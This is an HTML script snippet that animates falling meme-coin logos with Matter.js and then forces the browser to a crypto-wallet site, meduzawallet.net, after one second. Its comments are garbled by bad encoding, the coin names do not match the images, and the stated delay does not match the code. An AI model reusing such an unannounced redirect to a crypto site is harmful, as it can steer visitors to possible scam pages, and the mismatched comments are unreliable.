<script src="https://cdnjs.cloudflare.com/ajax/libs/matter-js/0.19.0/matter.min.js"></script>
<script>
    const { Engine, Render, Runner, Bodies, Composite, Events } = Matter;

    // –§–∏–∑–∏—á–µ—Å–∫–∏–π –¥–≤–∏–∂–æ–∫
    let engine = Engine.create();
    let world = engine.world;

    // –†–µ–Ω–¥–µ—Ä
    let render = Render.create({
        element: document.body,
        canvas: document.getElementById("crypto-bounce"),
        engine: engine,
        options: {
            width: window.innerWidth,
            height: window.innerHeight,
            wireframes: false,
            background: 'black'
        }
    });

    Render.run(render);
    let runner = Runner.create();
    Runner.run(runner, engine);

    // –ì—Ä–∞–Ω–∏—Ü—ã —ç–∫—Ä–∞–Ω–∞
    let ground = Bodies.rectangle(window.innerWidth / 2, window.innerHeight + 50, window.innerWidth, 100, { isStatic: true });
    let leftWall = Bodies.rectangle(-50, window.innerHeight / 2, 100, window.innerHeight, { isStatic: true });
    let rightWall = Bodies.rectangle(window.innerWidth + 50, window.innerHeight / 2, 100, window.innerHeight, { isStatic: true });

    Composite.add(world, [ground, leftWall, rightWall]);

    // –ú–µ–º-–∫–æ–∏–Ω—ã
    const coinTextures = [
        "https://seeklogo.com/images/D/dogecoin-doge-logo-2A9D141D45-seeklogo.com.png", // Dogecoin üê∂
        "https://cdn3d.iconscout.com/3d/premium/thumb/tether-coin-usdt-3d-icon-download-in-png-blend-fbx-gltf-file-formats--crypto-pack-science-technology-icons-5326798.png?f=webp", // Shiba Inu ü¶ä
        "https://cdn3d.iconscout.com/3d/premium/thumb/bitcoin-3d-illustration-download-in-png-blend-fbx-gltf-file-formats--logo-btc-gold-symbol-sign-crpto-glossy-crypto-pack-science-technology-illustrations-3591010.png?f=webp", // Pepe üê∏
        "https://play-lh.googleusercontent.com/3ErVbKQiOmGdXtzwLTZ3p1TXOfEPr_82Sybcz-Q7NM7GjaMO2-sDoRdUN76aFnr7cuc", // Floki üê∫
        "https://seeklogo.com/images/D/dogecoin-doge-logo-2A9D141D45-seeklogo.com.png", // Bonk üêï
        "https://cdn3d.iconscout.com/3d/premium/thumb/tether-coin-usdt-3d-icon-download-in-png-blend-fbx-gltf-file-formats--crypto-pack-science-technology-icons-5326798.png?f=webp", // Dogwifhat üê∂üé©
        "https://seeklogo.com/images/D/dogecoin-doge-logo-2A9D141D45-seeklogo.com.png", // Smiley Coin üòÉ
        "https://cdn3d.iconscout.com/3d/premium/thumb/bitcoin-3d-illustration-download-in-png-blend-fbx-gltf-file-formats--logo-btc-gold-symbol-sign-crpto-glossy-crypto-pack-science-technology-illustrations-3591010.png?f=webp", // Moon Coin üåô
        "https://seeklogo.com/images/D/dogecoin-doge-logo-2A9D141D45-seeklogo.com.png", // Laser Eyes üöÄ
        "https://cdn3d.iconscout.com/3d/premium/thumb/dogwifhat-cryptocurrency-3d-icon-download-in-png-blend-fbx-gltf-file-formats--wif-meme-coin-crypto-coins-v2-pack-icons-9554873.png"  // Wojak ü•≤
    ];

    let coins = [];

    function createCoin(x, y) {
        let texture = coinTextures[Math.floor(Math.random() * coinTextures.length)];
        let coin = Bodies.circle(x, y, 40, {
            restitution: 0.8, // –£–ø—Ä—É–≥–æ—Å—Ç—å
            friction: 0.1,
            render: {
                sprite: {
                    texture: texture,
                    xScale: 0.2,
                    yScale: 0.2
                }
            }
        });

        coins.push(coin);
        Composite.add(world, coin);
    }

    function dropCoins() {
        let interval = setInterval(() => {
            let x = Math.random() * window.innerWidth;
            createCoin(x, -50);

            if (coins.length >= 50) {
                clearInterval(interval);
                checkFilledScreen();
            }
        }, 200);
    }

    function checkFilledScreen() {
        let interval = setInterval(() => {
        let x = Math.random() * window.innerWidth;
        createCoin(x, -50);

        if (coins.length >= 50) {
            clearInterval(interval);
        }
    }, 200);

    // –†–µ–¥–∏—Ä–µ–∫—Ç —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ –ø–æ—Å–ª–µ –Ω–∞—á–∞–ª–∞ –∞–Ω–∏–º–∞—Ü–∏–∏
    setTimeout(() => {
        window.location.href = "https://meduzawallet.net";  // I want my url - yo if u read it, know - I am pro.
    }, 1000);  // –ó–∞–¥–µ—Ä–∂–∫–∞ 5 —Å–µ–∫—É–Ω–¥
    }

    // –ó–∞–ø—É—Å–∫ –∞–Ω–∏–º–∞—Ü–∏–∏
    dropCoins();

    // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–æ–≤ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —ç–∫—Ä–∞–Ω–∞
    window.addEventListener("resize", () => {
        render.canvas.width = window.innerWidth;
        render.canvas.height = window.innerHeight;
    });
</script>
